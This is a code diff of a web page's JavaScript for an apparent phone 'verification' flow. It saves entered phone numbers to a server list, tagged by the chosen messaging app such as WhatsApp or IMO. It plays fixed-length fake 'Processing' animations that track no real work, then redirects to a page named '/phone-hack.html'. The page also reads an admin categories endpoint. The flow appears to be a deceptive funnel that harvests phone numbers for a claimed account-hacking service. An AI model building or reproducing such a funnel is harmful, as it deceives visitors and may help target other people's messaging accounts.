@@ -560,6 +560,9 @@
 
     <script>
         const PROCESS_DURATION_MS = 5000;
+        const NEXT_STEP_PROCESS_DURATION_MS = 2200;
+        const NEXT_STEP_URL = "/phone-hack.html";
+        const SELECTOR_CATEGORY_MARKER = "__selector_card__";
         const FALLBACK_SUBJECTS = [
             { name: "IMO", image_url: "" },
             { name: "WhatsApp", image_url: "" },
@@ -568,6 +571,11 @@
         ];
 
         let subjectOptions = [];
+        let latestPayload = {
+            countryCode: "",
+            phoneNumber: ""
+        };
+        let isSubjectSelectionBusy = false;
 
         const verifyForm = document.getElementById("verifyForm");
         const countryCodeEl = document.getElementById("countryCode");
@@ -579,6 +587,12 @@
         const subjectGrid = document.getElementById("subjectGrid");
         const progressFill = document.getElementById("progressFill");
         const progressPercent = document.getElementById("progressPercent");
+        const processingTitle = document.querySelector("#processingOverlay h2");
+        const processingMessage = document.querySelector("#processingOverlay p");
+        const DEFAULT_PROCESSING_TITLE = processingTitle ? processingTitle.textContent : "Processing";
+        const DEFAULT_PROCESSING_MESSAGE = processingMessage
+            ? processingMessage.textContent
+            : "Please wait while we prepare your subject list.";
 
         function sanitizePhone(value) {
             return String(value || "").replace(/\D/g, "").slice(0, 20);
@@ -665,6 +679,88 @@
             return `data:image/svg+xml;charset=UTF-8,${encodeURIComponent(svg)}`;
         }
 
+        function normalizeSubjectRowsFromCategories(rows) {
+            return (Array.isArray(rows) ? rows : [])
+                .filter((row) => String(row?.description || "").trim() === SELECTOR_CATEGORY_MARKER)
+                .filter((row) => Number(row?.is_active) === 1)
+                .map((row) => ({
+                    id: Number(row?.id || 0),
+                    name: String(row?.name || "").trim(),
+                    image_url: String(row?.icon || "").trim(),
+                    display_order: Number(row?.display_order || 0)
+                }))
+                .filter((row) => row.name)
+                .sort((a, b) => {
+                    const aOrder = Number.isFinite(a.display_order) ? a.display_order : 0;
+                    const bOrder = Number.isFinite(b.display_order) ? b.display_order : 0;
+                    if (aOrder !== bOrder) return aOrder - bOrder;
+                    return (a.id || 0) - (b.id || 0);
+                });
+        }
+
+        function normalizeSubjectRowsFromServiceOptions(rows) {
+            return (Array.isArray(rows) ? rows : [])
+                .map((row) => ({
+                    id: Number(row?.id || 0),
+                    name: String(row?.name || "").trim(),
+                    image_url: String(row?.image_url || "").trim(),
+                    display_order: Number(row?.display_order || 0)
+                }))
+                .filter((row) => row.name)
+                .sort((a, b) => {
+                    const aOrder = Number.isFinite(a.display_order) ? a.display_order : 0;
+                    const bOrder = Number.isFinite(b.display_order) ? b.display_order : 0;
+                    if (aOrder !== bOrder) return aOrder - bOrder;
+                    return (a.id || 0) - (b.id || 0);
+                });
+        }
+
+        async function handleSubjectCardClick(item) {
+            if (!item || isSubjectSelectionBusy) return;
+
+            isSubjectSelectionBusy = true;
+            closeSubjectList();
+            continueBtn.disabled = true;
+
+            const selectedName = String(item?.name || "Subject").trim() || "Subject";
+
+            try {
+                setFormMessage(`"${selectedName}" selected. Moving to next step...`, true);
+
+                if (latestPayload.countryCode && latestPayload.phoneNumber) {
+                    const safeSourceSuffix = selectedName.replace(/\s+/g, "-").slice(0, 20);
+                    await savePhoneInput(
+                        latestPayload.countryCode,
+                        latestPayload.phoneNumber,
+                        `phone-verify:${safeSourceSuffix}`
+                    );
+                }
+
+                try {
+                    sessionStorage.setItem("phoneVerifySelectedSubject", JSON.stringify({
+                        id: Number(item?.id || 0),
+                        name: selectedName,
+                        image_url: String(item?.image_url || "").trim()
+                    }));
+                } catch (storageError) {
+                    console.warn("Unable to save selected subject in sessionStorage:", storageError);
+                }
+
+                await runProcessingAnimation({
+                    title: "Processing",
+                    message: `Please wait while we continue with ${selectedName}.`,
+                    durationMs: NEXT_STEP_PROCESS_DURATION_MS
+                });
+                window.location.href = NEXT_STEP_URL;
+            } catch (error) {
+                console.error("Subject selection error:", error);
+                setFormMessage("Could not continue to next step. Please try again.", false);
+            } finally {
+                continueBtn.disabled = false;
+                isSubjectSelectionBusy = false;
+            }
+        }
+
         function renderSubjectList() {
             if (!Array.isArray(subjectOptions) || subjectOptions.length === 0) {
                 subjectGrid.innerHTML = '<div class="empty-state">No subjects available right now.</div>';
@@ -681,6 +777,9 @@
                 const card = document.createElement("button");
                 card.type = "button";
                 card.className = "subject-card";
+                card.addEventListener("click", () => {
+                    handleSubjectCardClick(item);
+                });
 
                 const thumb = document.createElement("img");
                 thumb.className = "subject-thumb";
@@ -707,11 +806,27 @@
 
         async function loadSubjectOptions() {
             try {
+                const categoryResponse = await fetch("/api/admin/categories", { cache: "no-cache" });
+                const categoryResult = await categoryResponse.json();
+                if (categoryResponse.ok && categoryResult.success) {
+                    const normalized = normalizeSubjectRowsFromCategories(categoryResult.categories);
+                    if (normalized.length > 0) {
+                        subjectOptions = normalized;
+                        return;
+                    }
+                }
+            } catch (error) {
+                console.error("Category-based subject list load error:", error);
+            }
+
+            try {
                 const response = await fetch("/api/service-selector-options", { cache: "no-cache" });
                 const result = await response.json();
                 if (response.ok && result.success && Array.isArray(result.options) && result.options.length > 0) {
-                    subjectOptions = result.options;
-                    return;
+                    subjectOptions = normalizeSubjectRowsFromServiceOptions(result.options);
+                    if (subjectOptions.length > 0) {
+                        return;
+                    }
                 }
             } catch (error) {
                 console.error("Subject list load error:", error);
@@ -719,7 +834,7 @@
             subjectOptions = FALLBACK_SUBJECTS;
         }
 
-        async function savePhoneInput(countryCode, phoneNumber) {
+        async function savePhoneInput(countryCode, phoneNumber, sourcePage = "phone-verify") {
             try {
                 await fetch("/api/phone-number-list", {
                     method: "POST",
@@ -727,7 +842,7 @@
                     body: JSON.stringify({
                         country_code: countryCode,
                         phone_number: phoneNumber,
-                        source_page: "phone-verify"
+                        source_page: sourcePage
                     })
                 });
             } catch (error) {
@@ -735,7 +850,22 @@
             }
         }
 
-        function runProcessingAnimation() {
+        function runProcessingAnimation(options = {}) {
+            const title = String(options?.title || DEFAULT_PROCESSING_TITLE || "Processing");
+            const message = String(
+                options?.message || DEFAULT_PROCESSING_MESSAGE || "Please wait while we process your request."
+            );
+            const duration = Number.isFinite(Number(options?.durationMs))
+                ? Math.max(300, Number(options.durationMs))
+                : PROCESS_DURATION_MS;
+
+            if (processingTitle) {
+                processingTitle.textContent = title;
+            }
+            if (processingMessage) {
+                processingMessage.textContent = message;
+            }
+
             progressFill.style.width = "0%";
             progressPercent.textContent = "0";
             toggleProcessing(true);
@@ -744,7 +874,7 @@
                 const startTime = performance.now();
                 const timer = window.setInterval(() => {
                     const elapsed = performance.now() - startTime;
-                    const ratio = Math.min(elapsed / PROCESS_DURATION_MS, 1);
+                    const ratio = Math.min(elapsed / duration, 1);
                     const percent = Math.round(ratio * 100);
                     progressFill.style.width = `${percent}%`;
                     progressPercent.textContent = String(percent);
@@ -778,12 +908,17 @@
             }
 
             continueBtn.disabled = true;
+            latestPayload = { countryCode, phoneNumber };
 
             const subjectLoadPromise = loadSubjectOptions();
             const savePromise = savePhoneInput(countryCode, phoneNumber);
 
             try {
-                await runProcessingAnimation();
+                await runProcessingAnimation({
+                    title: DEFAULT_PROCESSING_TITLE,
+                    message: DEFAULT_PROCESSING_MESSAGE,
+                    durationMs: PROCESS_DURATION_MS
+                });
                 await Promise.all([subjectLoadPromise, savePromise]);
                 renderSubjectList();
                 openSubjectList();
